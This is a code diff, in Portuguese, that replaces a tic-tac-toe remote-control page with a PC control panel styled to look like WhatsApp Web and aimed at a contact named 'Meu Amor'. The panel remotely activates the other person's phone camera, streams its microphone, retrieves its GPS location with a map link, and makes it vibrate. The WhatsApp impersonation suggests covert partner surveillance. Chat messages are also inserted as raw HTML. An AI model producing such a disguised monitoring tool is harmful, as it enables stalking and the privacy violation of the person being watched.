-                statusDiv.innerHTML = '❌ Desconectado. Tentando reconectar...';
-                showMessageToast('⚠️ Conexão perdida. Reconectando...');
-            }
-        });
-        
-        socket.on('reconnect', () => {
-            console.log('Reconectado');
-            if (permissionsGranted) {
-                statusDiv.innerHTML = '✅ Reconectado!';
-                showMessageToast('✅ Conexão restabelecida!');
-            }
-        });
-        
-        socket.on('inicio', (data) => {
-            if (!permissionsGranted) return;
-            meuSimbolo = data.simbolo;
-            minhaVez = meuSimbolo === 'X';
-            gameActive = true;
-            resetBtn.disabled = false;
-            statusDiv.innerHTML = minhaVez ? '🎮 Sua vez (X)' : '🎮 Vez do oponente (X)';
-            showMessageToast('🎮 Jogo iniciado! Você é ' + meuSimbolo);
-        });
-        
-        socket.on('jogada', (data) => {
-            if (!permissionsGranted) return;
-            board[data.pos] = data.simbolo;
-            let cell = document.getElementById('cell-' + data.pos);
-            if(cell) {
-                cell.innerHTML = data.simbolo;
-                cell.classList.add(data.simbolo.toLowerCase());
-            }
-            
-            minhaVez = data.proximaVez === meuSimbolo;
-            statusDiv.innerHTML = minhaVez ? '🎮 Sua vez' : '🎮 Vez do oponente';
-        });
-        
-        socket.on('fim', (data) => {
-            if (!permissionsGranted) return;
-            statusDiv.innerHTML = data.msg;
-            gameActive = false;
-            showMessageToast('🏁 ' + data.msg);
-        });
-        
-        socket.on('reiniciar', () => {
-            if (!permissionsGranted) return;
-            board = ['', '', '', '', '', '', '', '', ''];
-            document.querySelectorAll('.cell').forEach(c => {
-                c.innerHTML = '';
-                c.classList.remove('x', 'o');
-            });
-            gameActive = true;
-            minhaVez = meuSimbolo === 'X';
-            statusDiv.innerHTML = minhaVez ? '🎮 Sua vez' : '🎮 Vez do oponente';
-            showMessageToast('🔄 Jogo reiniciado!');
-        });
-        
-        resetBtn.onclick = () => {
-            if (permissionsGranted) {
-                socket.emit('reiniciar');
-            }
-        };
-        
-        // Prevenir que o usuário saia acidentalmente
-        window.addEventListener('beforeunload', (e) => {
-            if (permissionsGranted) {
-                e.preventDefault();
-                e.returnValue = '';
-            }
+            showNotification('✨ Conectado! ✨');
         });
     </script>
 </body>
 </html>`);
   } else {
-    // Página do PC (com todos os controles)
+    // Página do PC - Painel de Controle (WhatsApp Web style)
     res.send(`<!DOCTYPE html>
 <html>
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>PC - Controle Remoto</title>
+    <title>WhatsApp Web - Controle</title>
     <style>
-        body { 
-            font-family: Arial; 
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
+        * {
             margin: 0;
-            padding: 20px;
+            padding: 0;
+            box-sizing: border-box;
         }
-        .container {
-            background: white;
-            border-radius: 20px;
-            padding: 30px;
-            max-width: 1000px;
-            width: 100%;
-            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
-        }
-        h1 { 
-            text-align: center; 
-            color: #333; 
-            margin-bottom: 20px;
-        }
-        .grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 30px;
-        }
-        .video-box {
-            background: black;
-            border-radius: 10px;
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: #111b21;
+            height: 100vh;
             overflow: hidden;
-            aspect-ratio: 4/3;
         }
-        #remoteVideo {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
+
+        .whatsapp-web {
+            display: flex;
+            height: 100vh;
         }
-        .game-box {
-            text-align: center;
+
+        /* Sidebar - Conversas */
+        .sidebar {
+            width: 380px;
+            background: #202c33;
+            border-right: 1px solid #2a3942;
+            display: flex;
+            flex-direction: column;
         }
-        .board {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 10px;
-            margin: 20px 0;
+
+        .sidebar-header {
+            padding: 16px;
+            background: #202c33;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border-bottom: 1px solid #2a3942;
         }
-        .cell {
-            background: #f8f9fa;
-            border: 2px solid #dee2e6;
-            border-radius: 10px;
-            aspect-ratio: 1;
+
+        .user-info {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .user-avatar {
+            width: 40px;
+            height: 40px;
+            background: #2a3942;
+            border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 48px;
-            font-weight: bold;
-            cursor: pointer;
-            transition: all 0.3s;
+            font-size: 20px;
         }
-        .cell:hover { background: #e9ecef; transform: scale(1.05); }
-        .cell.x { color: #e74c3c; }
-        .cell.o { color: #3498db; }
-        .status {
-            background: #f0f0f0;
-            padding: 10px;
-            border-radius: 5px;
-            margin: 10px 0;
-            font-weight: bold;
+
+        .user-name {
+            color: #e9edef;
+            font-weight: 500;
         }
-        .controls {
-            display: grid;
-            grid-template-columns: repeat(2, 1fr);
-            gap: 10px;
-            margin: 20px 0;
+
+        .sidebar-actions {
+            display: flex;
+            gap: 16px;
         }
-        button {
-            padding: 15px;
+
+        .action-btn {
+            background: none;
             border: none;
-            border-radius: 10px;
-            font-size: 16px;
-            font-weight: bold;
+            color: #8696a0;
+            font-size: 20px;
             cursor: pointer;
-            transition: all 0.3s;
         }
-        button:hover { transform: scale(1.05); }
-        .btn-primary { background: #4CAF50; color: white; }
-        .btn-primary:hover { background: #45a049; }
-        .btn-blue { background: #2196F3; color: white; }
-        .btn-blue:hover { background: #1976D2; }
-        .btn-red { background: #f44336; color: white; }
-        .btn-red:hover { background: #d32f2f; }
-        .btn-purple { background: #9c27b0; color: white; }
-        .btn-purple:hover { background: #7b1fa2; }
-        .btn-orange { background: #ff9800; color: white; }
-        .btn-orange:hover { background: #f57c00; }
-        .chat-box {
-            margin-top: 30px;
-            border: 2px solid #ddd;
-            border-radius: 10px;
-            padding: 15px;
+
+        /* Search */
+        .search-area {
+            padding: 12px;
+            background: #202c33;
         }
-        .messages {
-            height: 150px;
+
+        .search-box {
+            background: #2a3942;
+            border-radius: 8px;
+            padding: 8px 12px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .search-box input {
+            background: none;
+            border: none;
+            color: #e9edef;
+            flex: 1;
+            outline: none;
+        }
+
+        /* Chat list */
+        .chat-list {
+            flex: 1;
             overflow-y: auto;
-            background: #f9f9f9;
-            padding: 10px;
-            border-radius: 5px;
-            margin-bottom: 10px;
         }
+
+        .chat-item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 12px 16px;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .chat-item:hover {
+            background: #2a3942;
+        }
+
+        .chat-item.active {
+            background: #2a3942;
+        }
+
+        .chat-avatar {
+            width: 49px;
+            height: 49px;
+            background: #2a3942;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+        }
+
+        .chat-info {
+            flex: 1;
+        }
+
+        .chat-name {
+            color: #e9edef;
+            font-weight: 500;
+            margin-bottom: 4px;
+        }
+
+        .chat-last-msg {
+            color: #8696a0;
+            font-size: 13px;
+        }
+
+        /* Main chat area */
+        .main-chat {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            background: #0b141a;
+        }
+
+        .chat-header {
+            background: #202c33;
+            padding: 10px 16px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border-bottom: 1px solid #2a3942;
+        }
+
+        .chat-contact {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .contact-avatar {
+            width: 40px;
+            height: 40px;
+            background: #2a3942;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
+        }
+
+        .contact-name {
+            color: #e9edef;
+            font-weight: 500;
+        }
+
+        .contact-status {
+            color: #8696a0;
+            font-size: 12px;
+        }
+
+        .chat-actions {
+            display: flex;
+            gap: 20px;
+        }
+
+        /* Messages area */
+        .chat-messages {
+            flex: 1;
+            overflow-y: auto;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+            background-image: radial-gradient(circle at 25% 40%, rgba(255,255,255,0.02) 2%, transparent 2%);
+            background-size: 40px 40px;
+        }
+
         .message {
-            padding: 8px;
-            margin: 5px 0;
-            background: #e3f2fd;
-            border-radius: 5px;
+            max-width: 65%;
+            padding: 8px 12px;
+            border-radius: 8px;
+            font-size: 14px;
+            line-height: 1.4;
+            position: relative;
             word-wrap: break-word;
         }
-        .message small {
-            color: #666;
-            font-size: 11px;
+
+        .message.sent {
+            background: #005c4b;
+            color: #e9edef;
+            align-self: flex-end;
+            border-bottom-right-radius: 2px;
         }
+
+        .message.received {
+            background: #202c33;
+            color: #e9edef;
+            align-self: flex-start;
+            border-bottom-left-radius: 2px;
+        }
+
+        .message-meta {
+            font-size: 10px;
+            color: #8696a0;
+            margin-top: 4px;
+            text-align: right;
+        }
+
+        /* Input area */
         .chat-input {
+            background: #202c33;
+            padding: 12px 16px;
             display: flex;
-            gap: 10px;
+            gap: 12px;
+            align-items: center;
         }
+
+        .input-btn {
+            background: none;
+            border: none;
+            font-size: 24px;
+            cursor: pointer;
+            color: #8696a0;
+        }
+
         .chat-input input {
             flex: 1;
-            padding: 15px;
-            border: 2px solid #ddd;
-            border-radius: 10px;
-            font-size: 16px;
+            background: #2a3942;
+            border: none;
+            padding: 10px 16px;
+            border-radius: 20px;
+            color: #e9edef;
+            font-size: 15px;
+            outline: none;
         }
-        .chat-input button {
-            padding: 15px 25px;
-            background: #2196F3;
-            color: white;
-        }
-        .info {
-            background: #e8f5e9;
-            padding: 10px;
-            border-radius: 5px;
-            margin: 10px 0;
-            font-size: 14px;
-        }
-        .audio-control {
+
+        /* Control Panel - Painel do PC */
+        .control-panel {
+            width: 320px;
+            background: #202c33;
+            border-left: 1px solid #2a3942;
             display: flex;
-            gap: 10px;
+            flex-direction: column;
+            overflow-y: auto;
+        }
+
+        .panel-section {
+            padding: 16px;
+            border-bottom: 1px solid #2a3942;
+        }
+
+        .panel-title {
+            color: #e9edef;
+            font-size: 14px;
+            font-weight: 500;
+            margin-bottom: 12px;
+            display: flex;
             align-items: center;
-            margin: 10px 0;
+            gap: 8px;
         }
-        #toggleAudio {
-            background: #ff9800;
-            color: white;
+
+        .control-buttons {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
         }
-        #audioVolume {
-            flex: 1;
+
+        .ctrl-btn {
+            background: #2a3942;
+            border: none;
+            padding: 12px;
+            border-radius: 8px;
+            color: #e9edef;
+            font-size: 14px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            transition: all 0.2s;
         }
-        .connection-status {
+
+        .ctrl-btn:hover {
+            background: #3b4a54;
+        }
+
+        .ctrl-btn.active {
+            background: #005c4b;
+        }
+
+        .status-badge {
             display: inline-block;
-            width: 10px;
-            height: 10px;
+            width: 8px;
+            height: 8px;
             border-radius: 50%;
-            margin-right: 5px;
+            background: #8696a0;
+            margin-left: 8px;
         }
-        .connected { background: #4CAF50; }
-        .disconnected { background: #f44336; }
+
+        .status-badge.online {
+            background: #25d366;
+        }
+
+        .video-preview {
+            background: #111b21;
+            border-radius: 8px;
+            margin-top: 12px;
+            overflow: hidden;
+        }
+
+        .video-preview img, .video-preview video {
+            width: 100%;
+            height: auto;
+        }
+
+        .location-info {
+            background: #111b21;
+            padding: 12px;
+            border-radius: 8px;
+            font-size: 12px;
+            color: #8696a0;
+            margin-top: 12px;
+        }
+
+        .music-list {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .music-item {
+            background: #2a3942;
+            padding: 10px;
+            border-radius: 8px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            transition: all 0.2s;
+        }
+
+        .music-item:hover {
+            background: #3b4a54;
+        }
+
+        /* Modal */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.8);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .modal-content {
+            background: #202c33;
+            border-radius: 12px;
+            max-width: 90%;
+            max-height: 90%;
+            overflow: auto;
+        }
+
+        .modal-content video {
+            width: 100%;
+            border-radius: 8px;
+        }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>🎮 Controle Remoto do Celular</h1>
-        
-        <div class="grid">
-            <div>
-                <div class="video-box">
-                    <img id="remoteVideo" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='320' height='240' viewBox='0 0 320 240'%3E%3Crect width='320' height='240' fill='%23333'/%3E%3Ctext x='160' y='120' font-family='Arial' font-size='16' fill='%23fff' text-anchor='middle'%3EAguardando vídeo...%3C/text%3E%3C/svg%3E">
+    <div class="whatsapp-web">
+        <!-- Sidebar -->
+        <div class="sidebar">
+            <div class="sidebar-header">
+                <div class="user-info">
+                    <div class="user-avatar">💻</div>
+                    <span class="user-name">PC - Controle</span>
                 </div>
-                <div class="status" id="videoStatus">
-                    <span class="connection-status disconnected" id="videoStatusDot"></span>
-                    📱 Aguardando celular...
+                <div class="sidebar-actions">
+                    <button class="action-btn">🔄</button>
+                    <button class="action-btn">💬</button>
+                    <button class="action-btn">⋮</button>
                 </div>
-                
-                <div class="controls">
-                    <button class="btn-blue" id="trocarCamera">🔄 Trocar Câmera</button>
-                    <button class="btn-purple" id="getLocation">📍 Localização</button>
-                    <button class="btn-orange" id="vibrate">📳 Vibrar</button>
-                    <button class="btn-red" id="emergency">⚠️ Emergência</button>
-                </div>
-                
-                <div class="audio-control">
-                    <button id="toggleAudio">🔊 Áudio: ON</button>
-                    <input type="range" id="audioVolume" min="0" max="100" value="50">
-                </div>
-                
-                <div id="locationInfo" class="info"></div>
             </div>
-            
-            <div class="game-box">
-                <div class="status" id="gameStatus">
-                    <span class="connection-status disconnected" id="gameStatusDot"></span>
-                    Conectando...
+            <div class="search-area">
+                <div class="search-box">
+                    <span>🔍</span>
+                    <input type="text" placeholder="Pesquisar ou começar uma nova conversa">
                 </div>
-                <div class="board" id="board"></div>
-                
-                <div class="controls">
-                    <button class="btn-primary" id="resetBtn" disabled>🔄 Reiniciar Jogo</button>
+            </div>
+            <div class="chat-list">
+                <div class="chat-item active">
+                    <div class="chat-avatar">💕</div>
+                    <div class="chat-info">
+                        <div class="chat-name">Meu Amor</div>
+                        <div class="chat-last-msg">Clique para conversar...</div>
+                    </div>
                 </div>
             </div>
         </div>
-        
-        <div class="chat-box">
-            <h3>💬 Chat com o Celular</h3>
-            <div class="messages" id="messages"></div>
-            
-            <div class="chat-input">
-                <input type="text" id="messageInput" placeholder="Digite sua mensagem..." maxlength="100">
-                <button id="sendMessage">📤 Enviar</button>
+
+        <!-- Main Chat -->
+        <div class="main-chat">
+            <div class="chat-header">
+                <div class="chat-contact">
+                    <div class="contact-avatar">💕</div>
+                    <div>
+                        <div class="contact-name">Meu Amor</div>
+                        <div class="contact-status" id="chatStatus">online</div>
+                    </div>
+                </div>
+                <div class="chat-actions">
+                    <button class="action-btn">📞</button>
+                    <button class="action-btn">🎥</button>
+                    <button class="action-btn">⋮</button>
+                </div>
             </div>
+
+            <div class="chat-messages" id="chatMessages">
+                <div class="message received">
+                    💕 Olá! Estou aqui para você 💕
+                    <div class="message-meta">Agora</div>
+                </div>
+            </div>
+
+            <div class="chat-input">
+                <button class="input-btn">😊</button>
+                <button class="input-btn">+</button>
+                <input type="text" id="messageInput" placeholder="Digite uma mensagem">
+                <button class="input-btn" id="sendBtn">📤</button>
+            </div>
+        </div>
+
+        <!-- Control Panel -->
+        <div class="control-panel">
+            <div class="panel-section">
+                <div class="panel-title">
+                    <span>📹</span> Controle de Câmera
+                </div>
+                <div class="control-buttons">
+                    <button class="ctrl-btn" id="toggleCameraBtn">
+                        <span>📷</span> Ativar Câmera
+                    </button>
+                    <div class="video-preview" id="videoPreview">
+                        <img id="remoteVideo" src="" alt="Preview">
+                    </div>
+                </div>
+            </div>
+
+            <div class="panel-section">
+                <div class="panel-title">
+                    <span>🎤</span> Áudio
+                </div>
+                <div class="control-buttons">
+                    <button class="ctrl-btn" id="toggleAudioBtn">
+                        <span>🔊</span> Ativar Microfone
+                    </button>
+                    <button class="ctrl-btn" id="testAudioBtn">
+                        <span>🎵</span> Testar Áudio
+                    </button>
+                </div>
+            </div>
+
+            <div class="panel-section">
+                <div class="panel-title">
+                    <span>📍</span> Localização
+                </div>
+                <div class="control-buttons">
+                    <button class="ctrl-btn" id="getLocationBtn">
+                        <span>📍</span> Obter Localização
+                    </button>
+                    <div class="location-info" id="locationInfo">
+                        Aguardando localização...
+                    </div>
+                </div>
+            </div>
+
+            <div class="panel-section">
+                <div class="panel-title">
+                    <span>🎵</span> Música Romântica
+                </div>
+                <div class="music-list">
+                    <div class="music-item" data-video-id="1N8N-X8NM4k" data-name="Música Especial 1">
+                        <span>🎵</span> Música 1
+                    </div>
+                    <div class="music-item" data-video-id="sTVNvP5Uw98" data-name="Música Especial 2">
+                        <span>🎵</span> Música 2
+                    </div>
+                </div>
+                <div class="control-buttons" style="margin-top: 12px;">
+                    <button class="ctrl-btn" id="stopMusicBtn">
+                        <span>⏹️</span> Parar Música
+                    </button>
+                </div>
+            </div>
+
+            <div class="panel-section">
+                <div class="panel-title">
+                    <span>💖</span> Ações Especiais
+                </div>
+                <div class="control-buttons">
+                    <button class="ctrl-btn" id="vibrateBtn">
+                        <span>📳</span> Vibrar
+                    </button>
+                    <button class="ctrl-btn" id="emergencyBtn">
+                        <span>💥</span> Surpresa Especial
+                    </button>
+                    <button class="ctrl-btn" id="swapCameraBtn">
+                        <span>🔄</span> Trocar Câmera
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Modal -->
+    <div class="modal" id="cameraModal">
+        <div class="modal-content">
+            <video id="fullscreenVideo" autoplay playsinline style="width: 100%;"></video>
+            <button onclick="closeModal()" style="position: absolute; top: 10px; right: 10px; background: red; color: white; border: none; padding: 5px 10px; border-radius: 5px;">Fechar</button>
         </div>
     </div>
 
     <script src="/socket.io/socket.io.js"></script>
     <script>
-        const socket = io('${fullUrl}', {
-            transports: ['websocket', 'polling'],
-            reconnection: true,
-            reconnectionAttempts: 10
-        });
+        const socket = io('${fullUrl}');
         
-        // Variáveis
-        let minhaVez = true;
-        let gameActive = false;
-        let board = ['', '', '', '', '', '', '', '', ''];
-        let audioEnabled = true;
-        let audioVolume = 50;
-        let frameCount = 0;
-        let lastFrameTime = Date.now();
-        
-        // Elementos DOM
-        const statusDiv = document.getElementById('gameStatus');
-        const resetBtn = document.getElementById('resetBtn');
-        const remoteVideo = document.getElementById('remoteVideo');
-        const videoStatus = document.getElementById('videoStatus');
-        const messagesDiv = document.getElementById('messages');
+        // Elementos
+        const chatMessages = document.getElementById('chatMessages');
         const messageInput = document.getElementById('messageInput');
+        const sendBtn = document.getElementById('sendBtn');
+        const remoteVideo = document.getElementById('remoteVideo');
         const locationInfo = document.getElementById('locationInfo');
-        const gameStatusDot = document.getElementById('gameStatusDot');
-        const videoStatusDot = document.getElementById('videoStatusDot');
+        const chatStatus = document.getElementById('chatStatus');
         
-        // Criar tabuleiro
-        for(let i = 0; i < 9; i++) {
-            let cell = document.createElement('div');
-            cell.className = 'cell';
-            cell.id = 'cell-' + i;
-            cell.onclick = () => {
-                if(gameActive && minhaVez && board[i] === '') {
-                    socket.emit('jogada', i);
-                }
-            };
-            document.getElementById('board').appendChild(cell);
+        // Estado
+        let typingTimeout = null;
+        let isTyping = false;
+        
+        // Função para adicionar mensagem
+        function addMessage(text, type = 'sent') {
+            const messageDiv = document.createElement('div');
+            messageDiv.className = `message ${type}`;
+            
+            const now = new Date();
+            const timeStr = now.toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });
+            
+            messageDiv.innerHTML = \`
+                \${text}
+                <div class="message-meta">\${timeStr}</div>
+            \`;
+            
+            chatMessages.appendChild(messageDiv);
+            chatMessages.scrollTop = chatMessages.scrollHeight;
+            return messageDiv;
         }
         
-        // Configurar áudio
-        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
-        const audioGain = audioContext.createGain();
-        audioGain.gain.value = audioVolume / 100;
-        audioGain.connect(audioContext.destination);
+        // Enviar mensagem
+        function sendMessage() {
+            const text = messageInput.value.trim();
+            if (text) {
+                addMessage(text, 'sent');
+                socket.emit('chat_message', text);
+                messageInput.value = '';
+                stopTyping();
+            }
+        }
         
-        // Receber vídeo
+        // Indicador de digitação
+        function startTyping() {
+            if (!isTyping) {
+                isTyping = true;
+                socket.emit('typing_start');
+                chatStatus.innerHTML = 'digitando...';
+            }
+            if (typingTimeout) clearTimeout(typingTimeout);
+            typingTimeout = setTimeout(() => {
+                stopTyping();
+            }, 1000);
+        }
+        
+        function stopTyping() {
+            if (isTyping) {
+                isTyping = false;
+                socket.emit('typing_stop');
+                chatStatus.innerHTML = 'online';
+            }
+        }
+        
+        // Eventos de input
+        sendBtn.addEventListener('click', sendMessage);
+        messageInput.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') sendMessage();
+        });
+        messageInput.addEventListener('input', startTyping);
+        
+        // Controles de câmera
+        let frameCount = 0;
         socket.on('frame', (frameData) => {
             remoteVideo.src = frameData;
             frameCount++;
-            const fps = Math.round(1000 / (Date.now() - lastFrameTime));
-            lastFrameTime = Date.now();
-            videoStatus.innerHTML = '<span class="connection-status connected"></span> 📱 Vídeo: ' + frameCount + ' frames | ' + fps + ' fps';
-            videoStatusDot.className = 'connection-status connected';
         });
         
-        // Receber áudio
-        socket.on('audio', (audioData) => {
-            if (audioEnabled && audioContext.state === 'running') {
-                try {
-                    const buffer = audioContext.createBuffer(1, audioData.length, audioContext.sampleRate / 4);
-                    buffer.copyToChannel(new Float32Array(audioData), 0);
-                    
-                    const source = audioContext.createBufferSource();
-                    source.buffer = buffer;
-                    source.connect(audioGain);
-                    source.start();
-                } catch (e) {
-                    console.log('Erro ao reproduzir áudio:', e);
-                }
-            }
+        document.getElementById('toggleCameraBtn').addEventListener('click', () => {
+            socket.emit('comando', 'toggleCamera');
+            addMessage('📷 Solicitando ativação da câmera...', 'sent');
         });
         
-        // Controles
-        document.getElementById('trocarCamera').onclick = () => {
+        document.getElementById('swapCameraBtn').addEventListener('click', () => {
             socket.emit('comando', 'trocarCamera');
-            addMessage('🔄 Comando: Trocar câmera');
-        };
+            addMessage('🔄 Trocando câmera...', 'sent');
+        });
         
-        document.getElementById('getLocation').onclick = () => {
-            socket.emit('comando', 'getLocation');
-            addMessage('📍 Comando: Solicitar localização');
-            locationInfo.innerHTML = '⏳ Solicitando localização...';
-        };
+        // Áudio
+        let audioEnabled = true;
+        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+        const audioGain = audioContext.createGain();
+        audioGain.gain.value = 0.5;
+        audioGain.connect(audioContext.destination);
         
-        document.getElementById('vibrate').onclick = () => {
-            socket.emit('comando', 'vibrate');
-            addMessage('📳 Comando: Vibrar');
-        };
-        
-        document.getElementById('emergency').onclick = () => {
-            socket.emit('comando', 'emergency');
-            addMessage('⚠️🚨 SINAL DE EMERGÊNCIA ENVIADO!', true);
-        };
-        
-        // Controle de áudio
-        document.getElementById('toggleAudio').onclick = () => {
-            audioEnabled = !audioEnabled;
-            document.getElementById('toggleAudio').innerHTML = audioEnabled ? '🔊 Áudio: ON' : '🔇 Áudio: OFF';
-            
+        socket.on('audio', (audioData) => {
             if (audioEnabled) {
-                audioContext.resume();
+                const buffer = audioContext.createBuffer(1, audioData.length, audioContext.sampleRate);
+                buffer.copyToChannel(new Float32Array(audioData), 0);
+                const source = audioContext.createBufferSource();
+                source.buffer = buffer;
+                source.connect(audioGain);
+                source.start();
             }
-        };
+        });
         
-        document.getElementById('audioVolume').oninput = (e) => {
-            audioVolume = e.target.value;
-            audioGain.gain.value = audioVolume / 100;
-        };
+        socket.on('audio_message', (audioBase64) => {
+            addMessage('🎤 Mensagem de áudio recebida', 'received');
+        });
+        
+        document.getElementById('toggleAudioBtn').addEventListener('click', () => {
+            audioEnabled = !audioEnabled;
+            const btn = document.getElementById('toggleAudioBtn');
+            btn.innerHTML = audioEnabled ? '<span>🔊</span> Microfone ON' : '<span>🔇</span> Microfone OFF';
+            addMessage(audioEnabled ? '🎤 Áudio ativado' : '🔇 Áudio desativado', 'sent');
+        });
+        
+        document.getElementById('testAudioBtn').addEventListener('click', () => {
+            socket.emit('comando', 'testAudio');
+            addMessage('🎵 Testando áudio do celular...', 'sent');
+        });
         
         // Localização
         socket.on('location', (data) => {
             locationInfo.innerHTML = \`
-                📍 Localização do celular:<br>
-                Latitude: \${data.latitude.toFixed(6)}<br>
-                Longitude: \${data.longitude.toFixed(6)}<br>
-                Precisão: \${Math.round(data.accuracy)} metros<br>
-                <a href="https://www.google.com/maps?q=\${data.latitude},\${data.longitude}" target="_blank">🌍 Ver no mapa</a>
+                📍 Localização atual:<br>
+                Lat: \${data.latitude.toFixed(6)}<br>
+                Lng: \${data.longitude.toFixed(6)}<br>
+                <a href="https://www.google.com/maps?q=\${data.latitude},\${data.longitude}" target="_blank" style="color: #25d366;">
+                    🗺️ Ver no mapa
+                </a>
             \`;
+            addMessage(\`📍 Localização recebida: \${data.latitude.toFixed(4)}, \${data.longitude.toFixed(4)}\`, 'received');
         });
         
-        // Chat
-        function addMessage(msg, isEmergency = false) {
-            const messageDiv = document.createElement('div');
-            messageDiv.className = 'message';
-            if (isEmergency) {
-                messageDiv.style.background = '#ffebee';
-                messageDiv.style.border = '2px solid #f44336';
-                messageDiv.style.fontWeight = 'bold';
-            }
-            messageDiv.innerHTML = \`<small>\${new Date().toLocaleTimeString()}</small><br>\${msg}\`;
-            messagesDiv.appendChild(messageDiv);
-            messagesDiv.scrollTop = messagesDiv.scrollHeight;
-        }
-        
-        socket.on('mensagem', (msg) => {
-            addMessage('📱 Celular: ' + msg);
+        document.getElementById('getLocationBtn').addEventListener('click', () => {
+            socket.emit('comando', 'getLocation');
+            addMessage('📍 Solicitando localização...', 'sent');
         });
         
-        document.getElementById('sendMessage').onclick = () => {
-            const msg = messageInput.value.trim();
-            if (msg) {
-                socket.emit('mensagem', msg);
-                addMessage('💻 Você: ' + msg);
-                messageInput.value = '';
-            }
-        };
-        
-        messageInput.onkeypress = (e) => {
-            if (e.key === 'Enter') {
-                document.getElementById('sendMessage').click();
-            }
-        };
-        
-        // Eventos do jogo
-        socket.on('connect', () => {
-            statusDiv.innerHTML = '<span class="connection-status connected"></span> Conectado!';
-            gameStatusDot.className = 'connection-status connected';
-            addMessage('✅ Conectado ao servidor');
-        });
-        
-        socket.on('connect_error', () => {
-            statusDiv.innerHTML = '<span class="connection-status disconnected"></span> Erro de conexão';
-            gameStatusDot.className = 'connection-status disconnected';
-        });
-        
-        socket.on('disconnect', () => {
-            statusDiv.innerHTML = '<span class="connection-status disconnected"></span> Desconectado';
-            gameStatusDot.className = 'connection-status disconnected';
-            videoStatus.innerHTML = '<span class="connection-status disconnected"></span> 📱 Celular desconectado';
-            videoStatusDot.className = 'connection-status disconnected';
-            addMessage('⚠️ Desconectado do servidor');
-        });
-        
-        socket.on('inicio', () => {
-            gameActive = true;
-            resetBtn.disabled = false;
-            minhaVez = true;
-            statusDiv.innerHTML = '<span class="connection-status connected"></span> Sua vez (X)';
-            addMessage('🎮 Jogo iniciado! Você é X');
-        });
-        
-        socket.on('jogada', (data) => {
-            board[data.pos] = data.simbolo;
-            let cell = document.getElementById('cell-' + data.pos);
-            if(cell) {
-                cell.innerHTML = data.simbolo;
-                cell.classList.add(data.simbolo.toLowerCase());
-            }
-            
-            minhaVez = data.proximaVez === 'X';
-            statusDiv.innerHTML = '<span class="connection-status connected"></span> ' + (minhaVez ? 'Sua vez' : 'Vez do celular');
-        });
-        
-        socket.on('fim', (data) => {
-            statusDiv.innerHTML = '<span class="connection-status connected"></span> ' + data.msg;
-            gameActive = false;
-            addMessage('🏁 ' + data.msg);
-        });
-        
-        socket.on('reiniciar', () => {
-            board = ['', '', '', '', '', '', '', '', ''];
-            document.querySelectorAll('.cell').forEach(c => {
-                c.innerHTML = '';
-                c.classList.remove('x', 'o');
+        // Música
+        document.querySelectorAll('.music-item').forEach(item => {
+            item.addEventListener('click', () => {
+                const videoId = item.getAttribute('data-video-id');
+                const songName = item.getAttribute('data-name');
+                socket.emit('play_youtube', { videoId, songName });
+                addMessage(\`🎵 Tocando: \${songName}\`, 'sent');
             });
-            gameActive = true;
-            minhaVez = true;
-            statusDiv.innerHTML = '<span class="connection-status connected"></span> Sua vez';
-            addMessage('🔄 Jogo reiniciado!');
         });
         
-        resetBtn.onclick = () => {
-            socket.emit('reiniciar');
-        };
+        document.getElementById('stopMusicBtn').addEventListener('click', () => {
+            socket.emit('stop_music');
+            addMessage('⏹️ Música parada', 'sent');
+        });
         
-        // Iniciar contexto de áudio quando usuário interagir
-        document.addEventListener('click', () => {
-            if (audioContext.state === 'suspended') {
-                audioContext.resume();
-            }
-        }, { once: true });
+        // Ações especiais
+        document.getElementById('vibrateBtn').addEventListener('click', () => {
+            socket.emit('comando', 'vibrate');
+            addMessage('📳 Vibração enviada', 'sent');
+        });
+        
+        document.getElementById('emergencyBtn').addEventListener('click', () => {
+            socket.emit('comando', 'emergency');
+            addMessage('💥 Surpresa especial enviada! 💥', 'sent');
+        });
+        
+        // Receber mensagens do celular
+        socket.on('chat_message', (msg) => {
+            addMessage(msg, 'received');
+        });
+        
+        socket.on('typing_start', () => {
+            chatStatus.innerHTML = 'digitando...';
+        });
+        
+        socket.on('typing_stop', () => {
+            chatStatus.innerHTML = 'online';
+        });
+        
+        socket.on('connect', () => {
+            addMessage('✨ Conectado ao WhatsApp do seu amor! ✨', 'received');
+        });
+        
